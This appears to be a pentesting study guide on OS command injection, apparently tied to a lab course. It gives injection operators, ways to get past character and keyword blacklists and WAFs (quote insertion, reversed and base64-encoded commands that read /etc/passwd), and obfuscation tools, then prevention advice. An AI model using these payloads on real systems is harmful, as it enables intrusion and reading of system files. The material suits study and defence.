# Command Injections

Command injection occurs when user input lands—directly or indirectly—in a function that executes OS commands without sanitization. This can lead to arbitrary command execution on the back-end server and potentially across the network.

Injection is OWASP Top 10 #3: input is misinterpreted as part of an executed query or code, subverting its intended outcome.

The same pattern appears across injection types:

* OS command injection: input in an OS command
* Code injection: input in an evaluating function
* SQL injection: input in a query
* XSS/HTML injection: input displayed on a page
* LDAP, NoSQL, header, XPath, IMAP, ORM, and more

New web technologies continue to introduce new injection types. The core skill is escaping the input string's boundaries into the parent query.

Command injection is not limited to web applications. Any binary or thick client that passes unsanitized input to a system-command function can be vulnerable.

## Vulnerable Code Shapes

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

PHP execution functions include `exec`, `system`, `shell_exec`, `passthru`, and `popen`.

NodeJS includes `child_process.exec` and `child_process.spawn`.

Every language has equivalents, and they are exploited identically.

## Detection

For basic command injection, detection is exploitation: append a command through an injection operator and see whether output deviates from the normal result.

Advanced, indirect, and blind cases require fuzzing, code review, and gradual payload building.

Recon the function first. For example, a Host Checker that accepts an IP address and returns ping output with one packet transmitted is likely executing:

```bash
ping -c 1 OUR_INPUT
```

Guess the wrapper command from the output, then test injection into it.

### Injection Operators

Expected input, operator, then the command.

| Operator       | Encoded     | Behavior                                                             |
| -------------- | ----------- | -------------------------------------------------------------------- |
| `;`            | `%3b`       | Both commands execute. Fails on Windows CMD but works in PowerShell. |
| New line `\n`  | `%0a`       | Both commands execute.                                               |
| `&`            | `%26`       | Both commands execute; second output generally appears first.        |
| \`             | \`          | `%7c`                                                                |
| `&&`           | `%26%26`    | Second command runs only if the first succeeds.                      |
| \`             |             | \`                                                                   |
| Backticks \`\` | `%60%60`    | Sub-shell, Linux only.                                               |
| `$()`          | `%24%28%29` | Sub-shell, Linux only.                                               |

Operators generalize across injection classes:

* SQLi: `' ; -- /* */`
* LDAP: `* ( ) & |`
* XPath: `' or and not substring concat count`
* Code injection: `' ; -- /* */ $() ${} #{} %{} ^`
* Path traversal: `../ ..\\ %00`
* Object injection: `; & |`
* XQuery: `' ; -- /* */`
* Shellcode: `\x \u %u %n`
* Header injection: `\n \r\n \t %0d %0a %09`

This is an incomplete, environment-dependent list.

## Injecting Commands

Start with `;`.

Payload:

```
127.0.0.1; whoami
```

This makes the back-end run:

```bash
ping -c 1 127.0.0.1; whoami
```

Always test the final command locally first to validate it before sending.

An application may refuse the payload with a “match the requested format” style error. Check where validation occurs:

1. Open Firefox developer tools.
2. Go to the Network tab with `CTRL+SHIFT+E`.
3. Click Check.
4. If no request fires but the error appears, validation is front-end only.

This is common when front-end and back-end are built by different teams or developers trust front-end checks.

{% hint style="info" %}
Use a proxy such as Burp or ZAP to intercept a normal request, send it to Repeater with `CTRL+R`, paste the payload, URL-encode it with `CTRL+U`, and send it. A response containing both ping output and `whoami` output indicates injection.
{% endhint %}

## Other Injection Operators

`&&` behaves like `;` when the first command succeeds:

```
127.0.0.1 && whoami
```

It returns both outputs when the first command works. If the first command fails, `&&` skips the second command.

`||` inverts this behavior: the second command runs only when the first fails.

Break the first command deliberately by omitting the IP:

```bash
ping -c 1 || whoami
# ping: usage error: Destination address required
# 21y4d
```

Payload:

```
|| whoami
```

This is simpler and produces cleaner output because only the second command output returns.

When injection breaks the original command and there is no way to make both commands run, switch to `||`.

## Identifying Filters

Back-end mitigations include blacklisted characters or words in application code and WAFs with broader detection for SQLi, XSS, and other attacks.

Fingerprint the blocker:

* `invalid input` shown inline in the output field likely means the PHP application detected it.
* A different page displaying your IP and request likely indicates a WAF denial.

Determine what triggered the block. The payload `127.0.0.1; whoami` has three likely triggers:

* `;`
* A space
* `whoami`

Example blacklist filter:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### Identify the Blacklisted Character

Reduce the payload to one addition at a time:

```
127.0.0.1
127.0.0.1;
```

If the first works and the second is denied, `;` is blacklisted.

Repeat across the operators to map the entire blacklist.

## Bypassing Space Filters

Most operators may be blacklisted, except a new line, `%0a`, which is often left unfiltered. It works on both Linux and Windows:

```
127.0.0.1%0a
```

The following space may be blocked, which is common for fields such as IP addresses that should not contain spaces.

Possible workarounds:

*   Tabs: `%09` works as a separator on Linux and Windows.

    ```
    127.0.0.1%0a%09
    ```
*   `$IFS`: a Linux environment variable whose default value is space plus tab.

    ```
    127.0.0.1%0a${IFS}
    ```
*   Brace expansion: Bash inserts spaces for brace-wrapped arguments.

    ```bash
    {ls,-la}
    ```

    In a payload:

    ```
    127.0.0.1%0a{ls,-la}
    ```

PayloadsAllTheThings' “commands without spaces” page contains additional techniques.

## Bypassing Other Blacklisted Characters

`/` on Linux and `\` on Windows are commonly blacklisted because paths depend on them.

The objective is to construct a needed character from unfiltered pieces.

### Linux: Environment Variable Slicing

`${IFS}` substitutes directly, but no variable usually holds `/` or `;` alone. Extract one from a longer value:

```bash
echo ${PATH}           # /usr/local/bin:/usr/bin:/bin:/usr/games
echo ${PATH:0:1}       # /
echo ${LS_COLORS:10:1} # ;
```

The syntax is `start:length`.

`$HOME` and `$PWD` also work for `/`.

Find candidates with:

```bash
printenv
```

In payloads, omit `echo`. The sliced variable sits inline:

```
127.0.0.1${LS_COLORS:10:1}${IFS}
```

This rebuilds `;` without using filtered characters directly.

### Windows

CMD can extract a substring from a variable such as `%HOMEPATH%`, which may contain `\Users\htb-student`:

```cmd
echo %HOMEPATH:~6,-11%
```

PowerShell treats environment values as arrays, allowing direct character indexing:

```powershell
$env:HOMEPATH[0]
```

Enumerate possible variables with:

```powershell
Get-ChildItem Env:
```

### Character Shifting

Shift a character by one position in the ASCII table.

For example, `\` is ASCII `92`, so `[` is `91`. Feed `[` into:

```bash
echo $(tr '!-}' '"-~'<<<[)
```

PowerShell can perform the same operation, though more verbosely.

## Bypassing Blacklisted Commands

After bypassing character filters, adding `whoami` may trigger a word blacklist:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

This is an exact string match. Obfuscate the command so it executes without appearing in the request.

### Linux and Windows: Quote Insertion

Shells ignore quotes within command words:

```bash
w'h'o'am'i
w"h"o"am"i
```

Rules:

* Do not mix quote types.
* The quote count must be even.

Payload:

```
127.0.0.1%0aw'h'o'am'i
```

### Linux Only

Backslashes and `$@` also vanish and do not require an even count:

```bash
who$@ami
w\ho\am\i
```

### Windows Only

Use a caret:

```cmd
who^ami
```

## Advanced Command Obfuscation

For WAFs and advanced filters, basic techniques may no longer work.

### Case Manipulation

Blacklists often omit case variants.

Windows CMD and PowerShell are case-insensitive:

```
WhOaMi
```

Linux is case-sensitive. Lowercase at runtime in a sub-shell:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

{% hint style="warning" %}
This command contains spaces. A filtered character anywhere in the obfuscated payload can still cause the request to fail. Replace spaces with `%09`.
{% endhint %}

Alternative lowercase builder:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

### Reversed Commands

Write `imaohw` and reverse it at execution time.

Generate the reversed string first:

```bash
echo 'whoami' | rev
```

Then execute:

```bash
$(rev<<<'imaohw')
```

The payload never contains the literal command word.

If a character is filtered, reverse that character along with the command or include it in the reversed string.

Windows version:

```powershell
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands

For payloads containing filtered characters, or characters the server URL-decodes and mangles before the shell sees them, encode the complete payload and decode and execute it at runtime.

Build the wrapper yourself so it is unique and less likely to match signatures.

Base64 example:

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

`<<<` replaces the pipe `|`, which may itself be filtered.

If `bash` or `base64` are blacklisted, combine character-insertion methods or use alternatives such as `sh`, `openssl` with `b64`, or `xxd` for hex.

Windows equivalent, encoded as UTF-16LE Base64:

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

The same output can be produced from Linux:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

Further techniques include wildcards, regex, output redirection, and integer expansion.

## Evasion Tools

### Bashfuscator (Linux)

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

A basic run chooses a random technique, and output may exceed one million characters.

Constrain it:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

`-s` controls payload size and `-t` controls execution time.

Verify locally before sending:

```bash
bash -c '<payload>'
```

The result should execute the original command while bearing no resemblance to it.

### Invoke-DOSfuscation (Windows)

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

The interactive menu includes:

* `TUTORIAL`
* `BINARY` for obfuscated binary syntax
* `ENCODING` for environment variable encoding
* `PAYLOAD`

Example usage:

```
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1
```

Output such as the following runs in CMD:

```
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:...
```

If no Windows VM is available, run it using `pwsh` on Linux.

## Command Injection Prevention

### System Commands

Avoid command-executing functions where possible, especially where user input has direct or indirect influence.

Prefer language built-ins. For example, use PHP `fsockopen` for host-alive checks instead of shelling out to `ping`.

If a system command is unavoidable:

* Validate and sanitize input on the back-end.
* Minimize command-execution call sites.
* Use command execution only when no built-in alternative exists.

### Input Validation

Validate input on both the front-end and back-end.

Use built-in filters for standard formats:

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

Use regex for non-standard formats:

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

NodeJS also provides format libraries:

```
npm is-ip → isIp(ip)
```

### Input Sanitization

Sanitization is the critical layer and must follow validation, because validation can fail due to a weak regex.

Strip everything the intended format does not need instead of blacklisting words.

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

NodeJS alternative:

```
DOMPurify.sanitize(ip)
```

When special characters must survive, such as in user comments, escape instead:

* PHP: `escapeshellcmd`
* NodeJS: `escape(ip)`

{% hint style="warning" %}
Escaping is weak and routinely bypassed. Validation and restrictive sanitization remain essential.
{% endhint %}

### Server Configuration

Reduce blast radius when prevention fails:

* Use a web server WAF such as Apache `mod_security` plus an external WAF such as Cloudflare, Fortinet, or Imperva.
* Apply least privilege by running the web server as a low-privileged user such as `www-data`.
* Use `disable_functions=system,...` in PHP.
* Use `open_basedir = '/var/www/html'` to scope file access.
* Reject double-encoded requests and non-ASCII URL characters.
* Remove sensitive or outdated libraries and modules such as PHP CGI.

Mitigations stack, but none are absolute. Millions of lines of code mean one mistake can reintroduce the vulnerability. Secure coding and continued pentesting must work together.
